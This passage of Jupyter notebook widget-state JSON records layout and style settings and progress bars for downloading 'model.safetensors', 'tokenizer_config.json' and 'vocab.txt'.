            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "020fc470782d438d8f9ffba56247773f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "7c80b97a9ed44709b16da8fb84fffc53": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "877f54140a66466ab5cee9971458c262": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "3cb21a7c3bca4c8da105033ef5432580": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9e63621b4eab4bb08603cd647777b07f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "ae7418b1f6634882b73fb83727368400": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_968b9ad403284785ac46510c90235066",
              "IPY_MODEL_845b4b11e7b242988159f300c926c460",
              "IPY_MODEL_b05e7bef3ad24fc79cd964a7f9129b6d"
            ],
            "layout": "IPY_MODEL_9407d8684e034df5b1f256ef205760dd"
          }
        },
        "968b9ad403284785ac46510c90235066": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_569886d4109c4fc8baa5a6fe803fa1af",
            "placeholder": "​",
            "style": "IPY_MODEL_6146ace14f0a4c04a4aaece59728f233",
            "value": "model.safetensors: 100%"
          }
        },
        "845b4b11e7b242988159f300c926c460": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7259b2b93a0e4dbc81fec5d16ce818b9",
            "max": 437955512,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_4148f642eb0f47a4ace364b1fe9f7fb6",
            "value": 437955512
          }
        },
        "b05e7bef3ad24fc79cd964a7f9129b6d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_db3eba9b0587413595bb926ebb02290d",
            "placeholder": "​",
            "style": "IPY_MODEL_4f7c077ccd1d4b0c9c74f9fc3c3e9f5d",
            "value": " 438M/438M [00:03&lt;00:00, 148MB/s]"
          }
        },
        "9407d8684e034df5b1f256ef205760dd": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "569886d4109c4fc8baa5a6fe803fa1af": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "6146ace14f0a4c04a4aaece59728f233": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "7259b2b93a0e4dbc81fec5d16ce818b9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4148f642eb0f47a4ace364b1fe9f7fb6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "db3eba9b0587413595bb926ebb02290d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4f7c077ccd1d4b0c9c74f9fc3c3e9f5d": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "c883f23b659e46aa9eacac0140aeb013": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_c64d0067541642d088765c865ad5628b",
              "IPY_MODEL_456fd659df504e9b902bd60da7c90e5c",
              "IPY_MODEL_accca9c1ad9a443c8638039996b2505c"
            ],
            "layout": "IPY_MODEL_1829482d752e4e31a26c82f67127a28b"
          }
        },
        "c64d0067541642d088765c865ad5628b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7541c37691374dc3b5a578109e8d8c42",
            "placeholder": "​",
            "style": "IPY_MODEL_41e5eaacb312466baf175178c90367cd",
            "value": "tokenizer_config.json: 100%"
          }
        },
        "456fd659df504e9b902bd60da7c90e5c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_be4cbbe0bc734711b883f96cd2b76770",
            "max": 366,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_2ed348a564054f18a7b0b6cd2f9e424e",
            "value": 366
          }
        },
        "accca9c1ad9a443c8638039996b2505c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_fe3f2792ad9e4cb6ae57879c0c4e4805",
            "placeholder": "​",
            "style": "IPY_MODEL_e02a7b88a3f94aa2833f87877ff421b9",
            "value": " 366/366 [00:00&lt;00:00, 10.1kB/s]"
          }
        },
        "1829482d752e4e31a26c82f67127a28b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "7541c37691374dc3b5a578109e8d8c42": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "41e5eaacb312466baf175178c90367cd": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "be4cbbe0bc734711b883f96cd2b76770": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2ed348a564054f18a7b0b6cd2f9e424e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "fe3f2792ad9e4cb6ae57879c0c4e4805": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "e02a7b88a3f94aa2833f87877ff421b9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "7b4b4db9e2534d51a13f12eb106c4124": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_a94da1f4e8074d0ea0e5cbe0622b0a79",
              "IPY_MODEL_c0d1962141304b4aa7110396cca2a0a1",
              "IPY_MODEL_22c3a43d08c84bcfbf82cf4f1fb53770"
            ],
            "layout": "IPY_MODEL_250add9680bd43eea9028a4b6e7cf72d"
          }
        },
        "a94da1f4e8074d0ea0e5cbe0622b0a79": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_ebace4219de24d05b97991650d961ea8",
            "placeholder": "​",
            "style": "IPY_MODEL_466839ad260241b9bf52d3597a860f6f",
            "value": "vocab.txt: 100%"
          }
        },
        "c0d1962141304b4aa7110396cca2a0a1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_8669408f9517432a86d4e170dc838b15",
            "max": 231508,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_1287557c8db9427595285e7644775cf8",
            "value": 231508
          }
        },
        "22c3a43d08c84bcfbf82cf4f1fb53770": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_15ea4e1658524575b23d6d1e9eaa5349",
            "placeholder": "​",
            "style": "IPY_MODEL_0c8d2ccac6414bfb9159b20fa1195022",
            "value": " 232k/232k [00:00&lt;00:00, 5.44MB/s]"
          }
        },
        "250add9680bd43eea9028a4b6e7cf72d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "ebace4219de24d05b97991650d961ea8": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "466839ad260241b9bf52d3597a860f6f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "8669408f9517432a86d4e170dc838b15": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "1287557c8db9427595285e7644775cf8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "15ea4e1658524575b23d6d1e9eaa5349": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
